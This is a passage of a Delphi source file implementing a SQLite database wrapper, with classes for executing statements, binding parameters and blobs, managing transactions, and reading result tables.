          [FileName]);

//set a few configs
//L.G. Do not call it here. Because busy handler is not setted here,
// any share violation causing exception!

//    self.ExecSQL('PRAGMA SYNCHRONOUS=NORMAL;');
//    self.ExecSQL('PRAGMA temp_store = MEMORY;');

  finally
    if Assigned(Msg) then
      SQLite3_Free(Msg);
  end;

end;

//..............................................................................

destructor TSQLiteDatabase.Destroy;
begin
  if self.fInTrans then
    self.Rollback;  //assume rollback
  if Assigned(fDB) then
    SQLite3_Close(fDB);
  ParamsClear;    
  fParams.Free;
  inherited;
end;

function TSQLiteDatabase.GetLastInsertRowID: int64;
begin
  Result := Sqlite3_LastInsertRowID(self.fDB);
end;

function TSQLiteDatabase.GetLastChangedRows: int64;
begin
  Result := SQLite3_TotalChanges(self.fDB);
end;

//..............................................................................

procedure TSQLiteDatabase.RaiseError(s: string; SQL: string);
//look up last error and raise an exception with an appropriate message
var
  Msg: PAnsiChar;
  ret : integer;
begin

  Msg := nil;

  ret := sqlite3_errcode(self.fDB);
  if ret <> SQLITE_OK then
    Msg := sqlite3_errmsg(self.fDB);

  if Msg <> nil then
    raise ESqliteException.CreateFmt(s +'.'#13'Error [%d]: %s.'#13'"%s": %s', [ret, SQLiteErrorStr(ret),SQL, Msg])
  else
    raise ESqliteException.CreateFmt(s, [SQL, 'No message']);

end;

procedure TSQLiteDatabase.SetSynchronised(Value: boolean);
begin
  if Value <> fSync then
  begin
    if Value then
      ExecSQL('PRAGMA synchronous = ON;')
    else
      ExecSQL('PRAGMA synchronous = OFF;');
    fSync := Value;
  end;
end;

procedure TSQLiteDatabase.BindData(Stmt: TSQLiteStmt; const Bindings: array of const);
var
  BlobMemStream: TCustomMemoryStream;
  BlobStdStream: TStream;
  DataPtr: Pointer;
  DataSize: integer;
  AnsiStr: AnsiString;
  AnsiStrPtr: PAnsiString;
  I: integer;
begin
  for I := 0 to High(Bindings) do
  begin
    case Bindings[I].VType of
      vtString,
      vtAnsiString, vtPChar,
      vtWideString, vtPWideChar,
      vtChar, vtWideChar:
      begin
        case Bindings[I].VType of
          vtString: begin // ShortString
            AnsiStr := Bindings[I].VString^;
            DataPtr := PAnsiChar(AnsiStr);
            DataSize := Length(AnsiStr)+1;
          end;
          vtPChar: begin
            DataPtr := Bindings[I].VPChar;
            DataSize := -1;
          end;
          vtAnsiString: begin
            AnsiStrPtr := PAnsiString(@Bindings[I].VAnsiString);
            DataPtr := PAnsiChar(AnsiStrPtr^);
            DataSize := Length(AnsiStrPtr^)+1;
          end;
          vtPWideChar: begin
            DataPtr := PAnsiChar(UTF8Encode(WideString(Bindings[I].VPWideChar)));
            DataSize := -1;
          end;
          vtWideString: begin
            DataPtr := PAnsiChar(UTF8Encode(PWideString(@Bindings[I].VWideString)^));
            DataSize := -1;
          end;
          vtChar: begin
            DataPtr := PAnsiChar(String(Bindings[I].VChar));
            DataSize := 2;
          end;
          vtWideChar: begin
            DataPtr := PAnsiChar(UTF8Encode(WideString(Bindings[I].VWideChar)));
            DataSize := -1;
          end;
          else
            raise ESqliteException.Create('Unknown string-type');
        end;
        if (sqlite3_bind_text(Stmt, I+1, DataPtr, DataSize, SQLITE_STATIC) <> SQLITE_OK) then
          RaiseError('Could not bind text', 'BindData');
      end;
      vtInteger:
        if (sqlite3_bind_int(Stmt, I+1, Bindings[I].VInteger) <> SQLITE_OK) then
          RaiseError('Could not bind integer', 'BindData');
      vtInt64:
        if (sqlite3_bind_int64(Stmt, I+1, Bindings[I].VInt64^) <> SQLITE_OK) then
          RaiseError('Could not bind int64', 'BindData');
      vtExtended:
        if (sqlite3_bind_double(Stmt, I+1, Bindings[I].VExtended^) <> SQLITE_OK) then
          RaiseError('Could not bind extended', 'BindData');
      vtBoolean:
        if (sqlite3_bind_int(Stmt, I+1, Integer(Bindings[I].VBoolean)) <> SQLITE_OK) then
          RaiseError('Could not bind boolean', 'BindData');
      vtPointer:
      begin
        if (Bindings[I].VPointer = nil) then
        begin
          if (sqlite3_bind_null(Stmt, I+1) <> SQLITE_OK) then
            RaiseError('Could not bind null', 'BindData');
        end
        else
          raise ESqliteException.Create('Unhandled pointer (<> nil)');
      end;
      vtObject:
      begin
        if (Bindings[I].VObject is TCustomMemoryStream) then
        begin
          BlobMemStream := TCustomMemoryStream(Bindings[I].VObject);
          if (sqlite3_bind_blob(Stmt, I+1, @PAnsiChar(BlobMemStream.Memory)[BlobMemStream.Position],
              BlobMemStream.Size-BlobMemStream.Position, SQLITE_STATIC) <> SQLITE_OK) then
          begin
            RaiseError('Could not bind BLOB', 'BindData');
          end;
        end
        else if (Bindings[I].VObject is TStream) then
        begin
          BlobStdStream := TStream(Bindings[I].VObject);
          DataSize := BlobStdStream.Size;

          GetMem(DataPtr, DataSize);
          if (DataPtr = nil) then
            raise ESqliteException.Create('Error getting memory to save blob');

          BlobStdStream.Position := 0;
          BlobStdStream.Read(DataPtr^, DataSize);

          if (sqlite3_bind_blob(stmt, I+1, DataPtr, DataSize, @DisposePointer) <> SQLITE_OK) then
            RaiseError('Could not bind BLOB', 'BindData');
        end
        else             
          raise ESqliteException.Create('Unhandled object-type in binding');
      end
      else 
      begin
        raise ESqliteException.Create('Unhandled binding');
      end;
    end;
  end;
end;

procedure TSQLiteDatabase.ExecSQL(const SQL: Ansistring);
begin
  ExecSQL(SQL, []);
end;

procedure TSQLiteDatabase.ExecSQL(const SQL: Ansistring; const Bindings: array of const);
var
  Stmt: TSQLiteStmt;
  NextSQLStatement: PAnsiChar;
  iStepResult: integer;
begin
  try
    if Sqlite3_Prepare_v2(self.fDB, PAnsiChar(SQL), -1, Stmt, NextSQLStatement) <>
      SQLITE_OK then
      RaiseError('Error executing SQL', SQL);
    if (Stmt = nil) then
      RaiseError('Could not prepare SQL statement', SQL);
    DoQuery(SQL);
    SetParams(Stmt);
    BindData(Stmt, Bindings);

    iStepResult := Sqlite3_step(Stmt);
    if (iStepResult <> SQLITE_DONE) then
      begin
      SQLite3_reset(stmt);
      RaiseError('Error executing SQL statement', SQL);
      end;
  finally
    if Assigned(Stmt) then
      Sqlite3_Finalize(stmt);
  end;
end;

{$WARNINGS OFF}
procedure TSQLiteDatabase.ExecSQL(Query: TSQLiteQuery);
var
  iStepResult: integer;
begin
  if Assigned(Query.Statement) then
  begin
    iStepResult := Sqlite3_step(Query.Statement);

    if (iStepResult <> SQLITE_DONE) then
      begin
      SQLite3_reset(Query.Statement);
      RaiseError('Error executing prepared SQL statement', Query.SQL);
      end;
    Sqlite3_Reset(Query.Statement);
  end;
end;
{$WARNINGS ON}

{$WARNINGS OFF}
function TSQLiteDatabase.PrepareSQL(const SQL: Ansistring): TSQLiteQuery;
var
  Stmt: TSQLiteStmt;
  NextSQLStatement: PAnsiChar;
begin
  Result.SQL := SQL;
  Result.Statement := nil;

  if Sqlite3_Prepare(self.fDB, PAnsiChar(SQL), -1, Stmt, NextSQLStatement) <>
    SQLITE_OK then
    RaiseError('Error executing SQL', SQL)
  else
    Result.Statement := Stmt;

  if (Result.Statement = nil) then
    RaiseError('Could not prepare SQL statement', SQL);
  DoQuery(SQL);
end;
{$WARNINGS ON}

{$WARNINGS OFF}
procedure TSQLiteDatabase.BindSQL(Query: TSQLiteQuery; const Index: Integer; const Value: Integer);
begin
  if Assigned(Query.Statement) then
    sqlite3_Bind_Int(Query.Statement, Index, Value)
  else
    RaiseError('Could not bind integer to prepared SQL statement', Query.SQL);
end;
{$WARNINGS ON}

{$WARNINGS OFF}
procedure TSQLiteDatabase.BindSQL(Query: TSQLiteQuery; const Index: Integer; const Value: String);
begin
  if Assigned(Query.Statement) then
    Sqlite3_Bind_Text(Query.Statement, Index, PAnsiChar(Value), Length(Value), Pointer(SQLITE_STATIC))
  else
    RaiseError('Could not bind string to prepared SQL statement', Query.SQL);
end;
{$WARNINGS ON}

{$WARNINGS OFF}
procedure TSQLiteDatabase.ReleaseSQL(Query: TSQLiteQuery);
begin
  if Assigned(Query.Statement) then
  begin
    Sqlite3_Finalize(Query.Statement);
    Query.Statement := nil;
  end
  else
    RaiseError('Could not release prepared SQL statement', Query.SQL);
end;
{$WARNINGS ON}

procedure TSQLiteDatabase.UpdateBlob(const SQL: Ansistring; BlobData: TStream);
var
  iSize: integer;
  ptr: pointer;
  Stmt: TSQLiteStmt;
  Msg: PAnsiChar;
  NextSQLStatement: PAnsiChar;
  iStepResult: integer;
  iBindResult: integer;
begin
  //expects SQL of the form 'UPDATE MYTABLE SET MYFIELD = ? WHERE MYKEY = 1'
  if pos('?', SQL) = 0 then
    RaiseError('SQL must include a ? parameter', SQL);

  Msg := nil;
  try

    if Sqlite3_Prepare_v2(self.fDB, PAnsiChar(SQL), -1, Stmt, NextSQLStatement) <>
      SQLITE_OK then
      RaiseError('Could not prepare SQL statement', SQL);

    if (Stmt = nil) then
      RaiseError('Could not prepare SQL statement', SQL);
    DoQuery(SQL);

    //now bind the blob data
    iSize := BlobData.size;

    GetMem(ptr, iSize);

    if (ptr = nil) then
      raise ESqliteException.CreateFmt('Error getting memory to save blob',
        [SQL, 'Error']);

    BlobData.position := 0;
    BlobData.Read(ptr^, iSize);

    iBindResult := SQLite3_Bind_Blob(stmt, 1, ptr, iSize, @DisposePointer);

    if iBindResult <> SQLITE_OK then
      RaiseError('Error binding blob to database', SQL);

    iStepResult := Sqlite3_step(Stmt);

    if (iStepResult <> SQLITE_DONE) then
      begin
      SQLite3_reset(stmt);
      RaiseError('Error executing SQL statement', SQL);
      end;

  finally

    if Assigned(Stmt) then
      Sqlite3_Finalize(stmt);

    if Assigned(Msg) then
      SQLite3_Free(Msg);
  end;

end;

//..............................................................................

function TSQLiteDatabase.GetTable(const SQL: Ansistring): TSQLiteTable;
begin
  Result := TSQLiteTable.Create(Self, SQL);
end;

function TSQLiteDatabase.GetTable(const SQL: Ansistring; const Bindings: array of const): TSQLiteTable;
begin
  Result := TSQLiteTable.Create(Self, SQL, Bindings);
end;

function TSQLiteDatabase.GetUniTable(const SQL: Ansistring): TSQLiteUniTable;
begin
  Result := TSQLiteUniTable.Create(Self, SQL);
end;

function TSQLiteDatabase.GetUniTable(const SQL: Ansistring; const Bindings: array of const): TSQLiteUniTable;
begin
  Result := TSQLiteUniTable.Create(Self, SQL, Bindings);
end;

function TSQLiteDatabase.GetTableValue(const SQL: Ansistring): int64;
begin
  Result := GetTableValue(SQL, []);
end;

function TSQLiteDatabase.GetTableValue(const SQL: Ansistring; const Bindings: array of const): int64;
var
  Table: TSQLiteUniTable;
begin
  Result := 0;
  Table := self.GetUniTable(SQL, Bindings);
  try
    if not Table.EOF then
      Result := Table.FieldAsInteger(0);
  finally
    Table.Free;
  end;
end;

function TSQLiteDatabase.GetTableString(const SQL: Ansistring): String;
begin
  Result := GetTableString(SQL, []);
end;

function TSQLiteDatabase.GetTableString(const SQL: Ansistring; const Bindings: array of const): String;
var
  Table: TSQLiteUniTable;
begin
  Result := '';
  Table := self.GetUniTable(SQL, Bindings);
  try
    if not Table.EOF then
      Result := Table.FieldAsString(0);
  finally
    Table.Free;
  end;
end;

procedure TSQLiteDatabase.GetTableStrings(const SQL: Ansistring;
  const Value: TStrings);
var
  Table: TSQLiteUniTable;
begin
  Value.Clear;
  Table := self.GetUniTable(SQL);
  try
    while not table.EOF do
    begin
      Value.Add(Table.FieldAsString(0));
      table.Next;
    end;
  finally
    Table.Free;
  end;
end;

procedure TSQLiteDatabase.BeginTransaction;
begin
  if not self.fInTrans then
  begin
    self.ExecSQL('BEGIN TRANSACTION');
    self.fInTrans := True;
  end
  else
    raise ESqliteException.Create('Transaction already open');
end;

procedure TSQLiteDatabase.Commit;
begin
  self.ExecSQL('COMMIT');
  self.fInTrans := False;
end;

procedure TSQLiteDatabase.Rollback;
begin
  self.ExecSQL('ROLLBACK');
  self.fInTrans := False;
end;

function TSQLiteDatabase.TableExists(TableName: string): boolean;
var
  sql: string;
  ds: TSqliteTable;
begin
  //returns true if table exists in the database
  sql := 'select [sql] from sqlite_master where [type] = ''table'' and lower(name) = ''' +
    lowercase(TableName) + ''' ';
  ds := self.GetTable(sql);
  try
    Result := (ds.Count > 0);
  finally
    ds.Free;
  end;
end;

procedure TSQLiteDatabase.SetTimeout(Value: integer);
begin
  SQLite3_BusyTimeout(self.fDB, Value);
end;

function TSQLiteDatabase.Version: string;
begin
  Result := SQLite3_Version;
end;

procedure TSQLiteDatabase.AddCustomCollate(name: string;
  xCompare: TCollateXCompare);
begin
  sqlite3_create_collation(fdb, PAnsiChar(name), SQLITE_UTF8, nil, xCompare);
end;

procedure TSQLiteDatabase.AddSystemCollate;
begin
  {$IFDEF WIN32}
  sqlite3_create_collation(fdb, 'SYSTEM', SQLITE_UTF16LE, nil, @SystemCollate);
  {$ENDIF}
end;

procedure TSQLiteDatabase.ParamsClear;
var
  n: integer;
begin
  for n := fParams.Count - 1 downto 0 do
    TSQliteParam(fparams[n]).free;
  fParams.Clear;
end;

procedure TSQLiteDatabase.AddParamInt(name: string; value: int64);
var
  par: TSQliteParam;
begin
  par := TSQliteParam.Create;
  par.name := name;
  par.valuetype := SQLITE_INTEGER;
  par.valueinteger := value;
  fParams.Add(par);
end;

procedure TSQLiteDatabase.AddParamFloat(name: string; value: double);
var
  par: TSQliteParam;
begin
  par := TSQliteParam.Create;
  par.name := name;
  par.valuetype := SQLITE_FLOAT;
  par.valuefloat := value;
  fParams.Add(par);
end;

procedure TSQLiteDatabase.AddParamText(name: string; value: string);
var
  par: TSQliteParam;
begin
  par := TSQliteParam.Create;
  par.name := name;
  par.valuetype := SQLITE_TEXT;
  par.valuedata := value;
  fParams.Add(par);
end;

procedure TSQLiteDatabase.AddParamNull(name: string);
var
  par: TSQliteParam;
begin
  par := TSQliteParam.Create;
  par.name := name;
  par.valuetype := SQLITE_NULL;
  fParams.Add(par);
end;

procedure TSQLiteDatabase.SetParams(Stmt: TSQLiteStmt);
var
  n: integer;
  i: integer;
  par: TSQliteParam;
begin
  try
    for n := 0 to fParams.Count - 1 do
    begin
      par := TSQliteParam(fParams[n]);
      i := sqlite3_bind_parameter_index(Stmt, PAnsiChar(par.name));
      if i > 0 then
      begin
        case par.valuetype of
          SQLITE_INTEGER:
            sqlite3_bind_int64(Stmt, i, par.valueinteger);
          SQLITE_FLOAT:
            sqlite3_bind_double(Stmt, i, par.valuefloat);
          SQLITE_TEXT:
            sqlite3_bind_text(Stmt, i, PAnsiChar(par.valuedata),
              length(par.valuedata), SQLITE_TRANSIENT);
          SQLITE_NULL:
            sqlite3_bind_null(Stmt, i);
        end;
      end;
    end;
  finally
    ParamsClear;
  end;
end;

//database rows that were changed (or inserted or deleted) by the most recent SQL statement
function TSQLiteDatabase.GetRowsChanged: integer;
begin
 Result := SQLite3_Changes(self.fDB);
end;

procedure TSQLiteDatabase.DoQuery(value: string);
begin
  if assigned(OnQuery) then
    OnQuery(Self, Value);
end;

//------------------------------------------------------------------------------
// TSQLiteTable
//------------------------------------------------------------------------------

constructor TSQLiteTable.Create(DB: TSQLiteDatabase; const SQL: Ansistring);
begin
  Create(DB, SQL, []);
end;

constructor TSQLiteTable.Create(DB: TSQLiteDatabase; const SQL: Ansistring; const Bindings: array of const);
var
  Stmt: TSQLiteStmt;
  NextSQLStatement: PAnsiChar;
  iStepResult: integer;
  ptr: pointer;
  iNumBytes: integer;
  thisBlobValue: TMemoryStream;
  thisStringValue: pstring;
  thisDoubleValue: pDouble;
  thisIntValue: pInt64;
  thisColType: pInteger;
  i: integer;
  DeclaredColType: PAnsiChar;
  ActualColType: integer;
  ptrValue: PAnsiChar;
begin
  inherited create;
  try
    self.fRowCount := 0;
    self.fColCount := 0;
    //if there are several SQL statements in SQL, NextSQLStatment points to the
    //beginning of the next one. Prepare only prepares the first SQL statement.
    if Sqlite3_Prepare_v2(DB.fDB, PAnsiChar(SQL), -1, Stmt, NextSQLStatement) <> SQLITE_OK then
      DB.RaiseError('Error executing SQL', SQL);
    if (Stmt = nil) then
      DB.RaiseError('Could not prepare SQL statement', SQL);
    DB.DoQuery(SQL);
    DB.SetParams(Stmt);
    DB.BindData(Stmt, Bindings);

    iStepResult := Sqlite3_step(Stmt);
    while (iStepResult <> SQLITE_DONE) do
    begin
      case iStepResult of
        SQLITE_ROW:
          begin
            Inc(fRowCount);
            if (fRowCount = 1) then
            begin
            //get data types
              fCols := TStringList.Create;
              fColTypes := TList.Create;
              fColCount := SQLite3_ColumnCount(stmt);
              for i := 0 to Pred(fColCount) do
                fCols.Add(AnsiUpperCase(Sqlite3_ColumnName(stmt, i)));
              for i := 0 to Pred(fColCount) do
              begin
                new(thisColType);
                DeclaredColType := Sqlite3_ColumnDeclType(stmt, i);
                if DeclaredColType = nil then
                  thisColType^ := Sqlite3_ColumnType(stmt, i) //use the actual column type instead
                //seems to be needed for last_insert_rowid
                else
                  if (DeclaredColType = 'INTEGER') or (DeclaredColType = 'BOOLEAN') then
                    thisColType^ := dtInt
                  else
                    if (DeclaredColType = 'NUMERIC') or
                      (DeclaredColType = 'FLOAT') or
                      (DeclaredColType = 'DOUBLE') or
                      (DeclaredColType = 'REAL') then
                      thisColType^ := dtNumeric
                    else
                      if DeclaredColType = 'BLOB' then
                        thisColType^ := dtBlob
                      else
                        thisColType^ := dtStr;
                fColTypes.Add(thiscoltype);
              end;
              fResults := TList.Create;
            end;

          //get column values
            for i := 0 to Pred(ColCount) do
            begin
              ActualColType := Sqlite3_ColumnType(stmt, i);
              if (ActualColType = SQLITE_NULL) then
                fResults.Add(nil)
              else
                if pInteger(fColTypes[i])^ = dtInt then
                begin
                  new(thisintvalue);
                  thisintvalue^ := Sqlite3_ColumnInt64(stmt, i);
                  fResults.Add(thisintvalue);
                end
                else
                  if pInteger(fColTypes[i])^ = dtNumeric then
                  begin
                    new(thisdoublevalue);
                    thisdoublevalue^ := Sqlite3_ColumnDouble(stmt, i);
                    fResults.Add(thisdoublevalue);
                  end
                  else
                    if pInteger(fColTypes[i])^ = dtBlob then
                    begin
                      iNumBytes := Sqlite3_ColumnBytes(stmt, i);
                      if iNumBytes = 0 then
                        thisblobvalue := nil
                      else
                      begin
                        thisblobvalue := TMemoryStream.Create;
                        thisblobvalue.position := 0;
                        ptr := Sqlite3_ColumnBlob(stmt, i);
                        thisblobvalue.writebuffer(ptr^, iNumBytes);
                      end;
                      fResults.Add(thisblobvalue);
                    end
                    else
                    begin
                      new(thisstringvalue);
                      ptrValue := Sqlite3_ColumnText(stmt, i);
                      setstring(thisstringvalue^, ptrvalue, strlen(ptrvalue));
                      fResults.Add(thisstringvalue);
                    end;
            end;
          end;
        SQLITE_BUSY:
          raise ESqliteException.CreateFmt('Could not prepare SQL statement',
            [SQL, 'SQLite is Busy']);
      else
        begin
        SQLite3_reset(stmt);
        DB.RaiseError('Could not retrieve data', SQL);
        end;
      end;
      iStepResult := Sqlite3_step(Stmt);
    end;
    fRow := 0;
  finally
    if Assigned(Stmt) then
      Sqlite3_Finalize(stmt);
  end;
end;

//..............................................................................

destructor TSQLiteTable.Destroy;
var
  i: cardinal;
  iColNo: integer;
begin
  if Assigned(fResults) then
  begin
    for i := 0 to fResults.Count - 1 do
    begin
      //check for blob type
      iColNo := (i mod fColCount);
      case pInteger(self.fColTypes[iColNo])^ of
        dtBlob:
          TMemoryStream(fResults[i]).Free;
        dtStr:
          if fResults[i] <> nil then
          begin
            setstring(string(fResults[i]^), nil, 0);
            dispose(fResults[i]);
          end;
      else
        dispose(fResults[i]);
      end;
    end;
    fResults.Free;
  end;
  if Assigned(fCols) then
    fCols.Free;
  if Assigned(fColTypes) then
    for i := 0 to fColTypes.Count - 1 do
      dispose(fColTypes[i]);
  fColTypes.Free;
  inherited;
end;

//..............................................................................

function TSQLiteTable.GetColumns(I: integer): string;
begin
  Result := fCols[I];
end;

//..............................................................................

function TSQLiteTable.GetCountResult: integer;
begin
  if not EOF then
    Result := StrToInt(Fields[0])
  else
    Result := 0;
end;

function TSQLiteTable.GetCount: integer;
begin
  Result := FRowCount;
end;

//..............................................................................

function TSQLiteTable.GetEOF: boolean;
begin
  Result := fRow >= fRowCount;
end;

function TSQLiteTable.GetBOF: boolean;
begin
  Result := fRow <= 0;
end;

//..............................................................................

function TSQLiteTable.GetFieldByName(FieldName: string): string;
begin
  Result := GetFields(self.GetFieldIndex(FieldName));
end;

function TSQLiteTable.GetFieldIndex(FieldName: string): integer;
begin
  if (fCols = nil) then
  begin
    raise ESqliteException.Create('Field ' + fieldname + ' Not found. Empty dataset');
    exit;
  end;

  if (fCols.count = 0) then
  begin
    raise ESqliteException.Create('Field ' + fieldname + ' Not found. Empty dataset');
    exit;
  end;

  Result := fCols.IndexOf(AnsiUpperCase(FieldName));

  if (result < 0) then
  begin
    raise ESqliteException.Create('Field not found in dataset: ' + fieldname)
  end;
end;

//..............................................................................

function TSQLiteTable.GetFields(I: cardinal): string;
var
  thisvalue: pstring;
  thistype: integer;
begin
  Result := '';
  if EOF then
    raise ESqliteException.Create('Table is at End of File');
  //integer types are not stored in the resultset
  //as strings, so they should be retrieved using the type-specific
  //methods
  thistype := pInteger(self.fColTypes[I])^;

  case thistype of
    dtStr:
      begin
        thisvalue := self.fResults[(self.frow * self.fColCount) + I];
        if (thisvalue <> nil) then
          Result := thisvalue^
        else
          Result := '';
      end;
    dtInt:
      Result := IntToStr(self.FieldAsInteger(I));
    dtNumeric:
      Result := FloatToStr(self.FieldAsDouble(I));
    dtBlob:
      Result := self.FieldAsBlobText(I);
  else
    Result := '';
  end;
end;

function TSqliteTable.FieldAsBlob(I: cardinal): TMemoryStream;
begin
  if EOF then
    raise ESqliteException.Create('Table is at End of File');
  if (self.fResults[(self.frow * self.fColCount) + I] = nil) then
    Result := nil
  else
    if pInteger(self.fColTypes[I])^ = dtBlob then
      Result := TMemoryStream(self.fResults[(self.frow * self.fColCount) + I])
    else
      raise ESqliteException.Create('Not a Blob field');
end;

function TSqliteTable.FieldAsBlobText(I: cardinal): string;
var
  MemStream: TMemoryStream;
  Buffer: PAnsiChar;
begin
  Result := '';
  MemStream := self.FieldAsBlob(I);
  if MemStream <> nil then
    if MemStream.Size > 0 then
      begin
        MemStream.position := 0;
        {$IFDEF UNICODE}
        Buffer := AnsiStralloc(MemStream.Size + 1);
        {$ELSE}
        Buffer := Stralloc(MemStream.Size + 1);
        {$ENDIF}
        MemStream.readbuffer(Buffer[0], MemStream.Size);
        (Buffer + MemStream.Size)^ := chr(0);
        SetString(Result, Buffer, MemStream.size);
        strdispose(Buffer);
      end;
     //do not free the TMemoryStream here; it is freed when
     //TSqliteTable is destroyed

end;


function TSqliteTable.FieldAsInteger(I: cardinal): int64;
begin
  if EOF then
    raise ESqliteException.Create('Table is at End of File');
  if (self.fResults[(self.frow * self.fColCount) + I] = nil) then
    Result := 0
  else
    if pInteger(self.fColTypes[I])^ = dtInt then
      Result := pInt64(self.fResults[(self.frow * self.fColCount) + I])^
    else
      if pInteger(self.fColTypes[I])^ = dtNumeric then
        Result := trunc(strtofloat(pString(self.fResults[(self.frow * self.fColCount) + I])^))
      else
        raise ESqliteException.Create('Not an integer or numeric field');
end;

function TSqliteTable.FieldAsDouble(I: cardinal): double;
begin
  if EOF then
    raise ESqliteException.Create('Table is at End of File');
  if (self.fResults[(self.frow * self.fColCount) + I] = nil) then
    Result := 0
  else
    if pInteger(self.fColTypes[I])^ = dtInt then
      Result := pInt64(self.fResults[(self.frow * self.fColCount) + I])^
    else
      if pInteger(self.fColTypes[I])^ = dtNumeric then
        Result := pDouble(self.fResults[(self.frow * self.fColCount) + I])^
      else
        raise ESqliteException.Create('Not an integer or numeric field');
end;

function TSqliteTable.FieldAsString(I: cardinal): string;
begin
  if EOF then
    raise ESqliteException.Create('Table is at End of File');
  if (self.fResults[(self.frow * self.fColCount) + I] = nil) then
    Result := ''
  else
    Result := self.GetFields(I);
end;

function TSqliteTable.FieldIsNull(I: cardinal): boolean;
var
  thisvalue: pointer;
begin
  if EOF then
    raise ESqliteException.Create('Table is at End of File');
  thisvalue := self.fResults[(self.frow * self.fColCount) + I];
  Result := (thisvalue = nil);
end;

//..............................................................................

function TSQLiteTable.Next: boolean;
begin
  Result := False;
  if not EOF then
  begin
    Inc(fRow);
    Result := True;
  end;
end;

function TSQLiteTable.Previous: boolean;
begin
  Result := False;
  if not BOF then
  begin
    Dec(fRow);
    Result := True;
  end;
end;

function TSQLiteTable.MoveFirst: boolean;
begin
  Result := False;
  if self.fRowCount > 0 then
  begin
    fRow := 0;
    Result := True;
  end;
end;

function TSQLiteTable.MoveLast: boolean;
begin
  Result := False;
  if self.fRowCount > 0 then
  begin
    fRow := fRowCount - 1;
    Result := True;
  end;
end;

{$WARNINGS OFF}
function TSQLiteTable.MoveTo(position: cardinal): boolean;
begin
  Result := False;
  if (self.fRowCount > 0) and (self.fRowCount > position) then
  begin
    fRow := position;
    Result := True;
  end;
end;
{$WARNINGS ON}



{ TSQLiteUniTable }

constructor TSQLiteUniTable.Create(DB: TSQLiteDatabase; const SQL: Ansistring);
begin
  Create(DB, SQL, []);
end;

constructor TSQLiteUniTable.Create(DB: TSQLiteDatabase; const SQL: Ansistring; const Bindings: array of const);
var
  NextSQLStatement: PAnsiChar;
  i: integer;
begin
  inherited create;
  self.fDB := db;
  self.fEOF := false;
  self.fRow := 0;
  self.fColCount := 0;
  self.fSQL := SQL;
  if Sqlite3_Prepare_v2(DB.fDB, PAnsiChar(SQL), -1, fStmt, NextSQLStatement) <> SQLITE_OK then
    DB.RaiseError('Error executing SQL', SQL);
  if (fStmt = nil) then
    DB.RaiseError('Could not prepare SQL statement', SQL);
  DB.DoQuery(SQL);
  DB.SetParams(fStmt);
  DB.BindData(fStmt, Bindings);

  //get data types
  fCols := TStringList.Create;
  fColCount := SQLite3_ColumnCount(fstmt);
  for i := 0 to Pred(fColCount) do
    fCols.Add(AnsiUpperCase(Sqlite3_ColumnName(fstmt, i)));

  Next;
end;

destructor TSQLiteUniTable.Destroy;
begin
  if Assigned(fStmt) then
    Sqlite3_Finalize(fstmt);
  if Assigned(fCols) then
    fCols.Free;
  inherited;
end;

function TSQLiteUniTable.FieldAsBlob(I: cardinal): TMemoryStream;
var
  iNumBytes: integer;
  ptr: pointer;
begin
  Result := TMemoryStream.Create;
  iNumBytes := Sqlite3_ColumnBytes(fstmt, i);
  if iNumBytes > 0 then
  begin
    ptr := Sqlite3_ColumnBlob(fstmt, i);
    Result.writebuffer(ptr^, iNumBytes);
    Result.Position := 0;
  end;
end;

function TSQLiteUniTable.FieldAsBlobPtr(I: cardinal; out iNumBytes: integer): Pointer;
begin
  iNumBytes := Sqlite3_ColumnBytes(fstmt, i);
  Result := Sqlite3_ColumnBlob(fstmt, i);
end;

function TSQLiteUniTable.FieldAsBlobText(I: cardinal): string;
var
  MemStream: TMemoryStream;
  Buffer: PAnsiChar;
begin
  Result := '';
  MemStream := self.FieldAsBlob(I);
  if MemStream <> nil then
     try
      if MemStream.Size > 0 then
      begin
        MemStream.position := 0;
        {$IFDEF UNICODE}
        Buffer := AnsiStralloc(MemStream.Size + 1);
        {$ELSE}
        Buffer := Stralloc(MemStream.Size + 1);
        {$ENDIF}
        MemStream.readbuffer(Buffer[0], MemStream.Size);
        (Buffer + MemStream.Size)^ := chr(0);
        SetString(Result, Buffer, MemStream.size);
        strdispose(Buffer);
      end;
     finally
     MemStream.Free;
     end
end;

function TSQLiteUniTable.FieldAsDouble(I: cardinal): double;
begin
  Result := Sqlite3_ColumnDouble(fstmt, i);
end;

function TSQLiteUniTable.FieldAsInteger(I: cardinal): int64;
begin
  Result := Sqlite3_ColumnInt64(fstmt, i);
end;

function TSQLiteUniTable.FieldAsString(I: cardinal): string;
begin
  Result := self.GetFields(I);
end;

function TSQLiteUniTable.FieldIsNull(I: cardinal): boolean;
begin
  Result := Sqlite3_ColumnText(fstmt, i) = nil;
end;

function TSQLiteUniTable.GetColumns(I: integer): string;
begin
  Result := fCols[I];
end;

function TSQLiteUniTable.GetFieldByName(FieldName: string): string;
begin
  Result := GetFields(self.GetFieldIndex(FieldName));
end;

function TSQLiteUniTable.GetFieldIndex(FieldName: string): integer;
begin
  if (fCols = nil) then
  begin
    raise ESqliteException.Create('Field ' + fieldname + ' Not found. Empty dataset');
    exit;
  end;

  if (fCols.count = 0) then
  begin
    raise ESqliteException.Create('Field ' + fieldname + ' Not found. Empty dataset');
    exit;
  end;

  Result := fCols.IndexOf(AnsiUpperCase(FieldName));

  if (result < 0) then
  begin
    raise ESqliteException.Create('Field not found in dataset: ' + fieldname)
  end;
end;

function TSQLiteUniTable.GetFields(I: cardinal): string;
begin
  Result := Sqlite3_ColumnText(fstmt, i);
end;

function TSQLiteUniTable.Next: boolean;
var
  iStepResult: integer;
begin
  fEOF := true;
  iStepResult := Sqlite3_step(fStmt);
  case iStepResult of
    SQLITE_ROW:
      begin
        fEOF := false;
        inc(fRow);
      end;
    SQLITE_DONE:
      // we are on the end of dataset
      // return EOF=true only
      ;
  else
    begin
    SQLite3_reset(fStmt);
    fDB.RaiseError('Could not retrieve data', fSQL);
    end;
  end;
  Result := not fEOF;
end;
end.
